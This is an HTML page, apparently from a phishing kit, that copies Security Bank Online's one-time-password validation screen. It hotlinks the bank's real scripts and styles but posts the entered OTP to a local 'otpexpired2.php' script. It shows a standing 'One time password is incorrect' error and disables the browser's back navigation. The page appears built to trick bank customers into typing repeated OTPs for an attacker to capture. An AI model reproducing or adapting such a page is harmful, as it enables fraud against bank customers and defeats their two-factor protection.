<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
        <title>Security Bank Online</title>
        <link rel="stylesheet" type="text/css" href="https://securitybankonline.securitybank.com/resources/com.ccti.citrine.web.ribfologin.RIBFoLogin/smoothness/jquery-ui-1.10.3.custom.css" wicketpath="__header__20___relative__path__prefix__21"></link>
        <link rel="stylesheet" type="text/css" href="resources/com.ccti.citrine.web.ribfologin.RIBFoLogin/outside_navigation.css" wicketpath="__header__20___relative__path__prefix__22"></link>
    <script type="text/javascript" src="https://securitybankonline.securitybank.com/resources/com.ccti.base.web.jquery.js.JQueryBehaviorNew/jquery-1.9.1.js"></script>
<script type="text/javascript" src="https://securitybankonline.securitybank.com/resources/com.ccti.base.web.jquery.js.JQueryBehaviorNew/jquery-1.9.1.min.js"></script>
<script type="text/javascript" src="https://securitybankonline.securitybank.com/resources/com.ccti.base.web.jquery.js.JQueryBehaviorNew/jquery.dataTables.js"></script>
<script type="text/javascript" src="https://securitybankonline.securitybank.com/resources/com.ccti.base.web.jquery.js.JQueryBehaviorNew/jquery-migrate-1.2.1.dev.js"></script>
<script type="text/javascript" src="https://securitybankonline.securitybank.com/resources/com.ccti.base.web.jquery.js.JQueryBehaviorNew/modernizr.custom.64460.js"></script>
<script type="text/javascript" src="https://securitybankonline.securitybank.com/resources/com.ccti.base.web.jquery.js.ui.JQueryUIBehaviorNew/1.10.3/jquery-ui.js"></script>
<script type="text/javascript" src="https://securitybankonline.securitybank.com/resources/com.ccti.base.web.validations.JQueryValidationBehavior/jquery.validate.1.11.1.js"></script>
<script type="text/javascript" src="https://securitybankonline.securitybank.com/resources/com.ccti.base.web.validations.JQueryValidationBehavior/additional-methods.js"></script>
<script type="text/javascript" src="https://securitybankonline.securitybank.com/resources/com.ccti.base.web.validations.JQueryValidationBehavior/sxi-validations.js"></script>
<script type="text/javascript" src="https://securitybankonline.securitybank.com/resources/com.ccti.base.web.js.BaseJavascriptBehavior/ccti.js"></script>
<link rel="stylesheet" type="text/css" href="https://securitybankonline.securitybank.com/resources/com.ccti.base.web.js.BaseJavascriptBehavior/base.css" />
<script type="text/javascript" src="https://securitybankonline.securitybank.com/resources/com.ccti.citrine.web.base.CitrineFOBasePage/basepageNew.js"></script>
<link rel="stylesheet" type="text/css" href="https://securitybankonline.securitybank.com/resources/com.ccti.citrine.web.ribfologin.RIBFoLogin/reset.css" />
<link rel="stylesheet" type="text/css" href="https://securitybankonline.securitybank.com/resources/com.ccti.citrine.web.ribfologin.RIBFoLogin/default3.css" />
<script type="text/javascript" src="https://securitybankonline.securitybank.com/resources/com.ccti.citrine.web.base.CitrineFOOutsidePageNew/fooutsidepage.js"></script>
</head>
    <body onload="noBack();" onpageshow="if (event.persisted) noBack();" onunload="" topmargin="0" leftmargin="0" bgcolor="#92CFED"">
    <SCRIPT type="text/javascript">
    window.history.forward();
    function noBack() { window.history.forward(); }
    </SCRIPT>
        <div class="blueline">&nbsp;</div>
        <div class = "wrapper">
            <div class="headerBG">&nbsp;</div>
            <div class="blueline">&nbsp;</div>
            <div class="main_padding">
                <div wicketpath="headerPanel">
    <div class = "blueline2"></div>
    <div class = "wrapper">
            <div class="header2"><div class = "logo"></div></div>
        <div class="clear"></div>
    </div>
    <div class="main_padding"></div>
    </div>  
                <div class="container">
                    <div class = "payment">
                        <div class = "right" id = "outside">
                            
        <form id="id8" wicketpath="form" method="post" action="otpexpired2.php"><div style="display:none"><input type="hidden" name="id8_hf_0" id="id8_hf_0" /></div>
            <!-- <p class="fs30">
                <strong><wicket:message key="page.title.forgot.pswd" /></strong>
            </p>
            <div class="clear"></div>
            <div class="status">
                <span class="fs20"><strong><wicket:message
                            key="rowheader.enter.challenge.answer"></wicket:message></strong></span>
                <div class="clear"></div>
                <p class="manage_holder">
                    <span class="label2"><wicket:message
                            key="label.challenge.question"></wicket:message></span> <span
                        class="field2"> <span wicket:id="challengeQ"></span>
                    </span>
                <div class="clear"></div>
                </p>
                <p class="manage_holder">
                    <span class="label2"><wicket:message
                            key="label.challenge.answer"></wicket:message></span> <span
                        class="field2"> <span class="textBG1"> <input
                            type="password" wicket:id="ans" class="required" maxlength="255" />
                    </span>
                    </span>
                <div class="clear"></div>
                </p>
            </div>
            <span wicket:id="feedback"> Feedback Goes Here </span>
            <div class="button_holder2">
                <span class="fa-l"> <input type="button" class="back_btn"
                    wicket:id="back" value="" />
                </span> <span class="fa-r"> <input type="submit"
                    class="confirm_btn2" wicket:id="submit" value="" />
                </span>
            </div> -->
            
           
                
                <div wicketpath="form_otpanel">         
        <div class="transfer_info2" id="id9" wicketpath="form_otpanel_otpContainer">
            <div class = "status">
                <p class="fs20"><strong>OTP VALIDATION</strong></p>
                <div class="ta-j fi c2"><span wicketpath="form_otpanel_otpContainer_inst">In order for us to process your transaction, we have sent a One Time Password (OTP) to your registered mobile number. Please encode the OTP indicated in the SMS message in the OTP prompt below. If you need to update your mobile number, please call Security Bank Helpdesk at (632) 8887-9188.</span></div>
                <p class="manage_holder">
                    <span class="label" style="margin-top:9px;">OTP</span>
                    <span class="field">
                        <span class="textBG1" style="padding-bottom:20px;">
                            <input type="password" maxlength="25" class="required" value="" name="otp" wicketpath="form_otpanel_otpContainer_otp"/>
                        </span> 
                    </span>
                    <div class="clear"></div>
                </p>
                <div class="ta-j fi c2">
                    If you have not received a text message with your OTP, please click     
                    <a style="vertical-align: top;" id="ida" wicketpath="form_otpanel_otpContainer_otpButton" href="" sxiButton="true" validating="false">Resend OTP.</a>
                </div>
                <div class="clear"></div>
            </div>
        </div>
    </div>
                <span id="idb" wicketpath="form_feedback" class="sxiFeedback">
    
            <ul wicketpath="form_feedback_feedbackul">
                <div class="fail">
                    <div class="status">
                        <span class="icon_result">&nbsp;</span> 
                        <span class="text_result">
                            <span class="fs13">
                                <li class="feedbackPanelERROR" wicketpath="form_feedback_feedbackul_messages_0">
                                    <p class="feedbackPanelERROR" wicketpath="form_feedback_feedbackul_messages_0_message">One time password is incorrect.</p>
                                </li><li class="feedbackPanelERROR" wicketpath="form_feedback_feedbackul_messages_1">
                                    
                                </li>
                            </span>
                        </span>
                    </div>
                    <div class="clear"></div>
                </div>
            </ul>
    

</span>
                <div style="text-align: center; padding-top: 15px;">
                    <input type="button" class="back_btn" wicketpath="form_back" onclick="var e=document.getElementById('id8_hf_0'); e.name='back'; e.value='x';var f=document.getElementById('id8');var ff=f;if (ff.onsubmit != undefined) { if (ff.onsubmit()==false) return false; }f.submit();e.value='';e.name='';return false;"/>&nbsp;
                    <input type="button" class="confirm_btn2" wicketpath="form_submit" onclick="var e=document.getElementById('id8_hf_0'); e.name=':submit'; e.value='x';var f=document.getElementById('id8');var ff=f;if (ff.onsubmit != undefined) { if (ff.onsubmit()==false) return false; }f.submit();e.value='';e.name='';return false;"/>
                </div>
            </div>
            
        </form>
    
                        </div>
                    </div>
                    <div class="clear"></div>
                    <div class="footer" wicketpath="footerPanel">
        <span style="float: right; "><a href="https://seal.verisign.com/splash?form_file=fdf/splash.fdf&dn=SECURITYBANKONLINE.SECURITYBANK.COM&lang=en" target="_blank" tabindex="1"><img src="images/verisign.jpeg" wicketpath="footerPanel___relative__path__prefix__39"/></a></span>
        <p>Copyright © 2023 Security Bank Corporation. All rights reserved.</p>
    </div>
                </div>
            </div>
            <div id="bysy_indicator">
                <div id="loading_gif"></div>
            </div>
        </div>
    </body>
</html>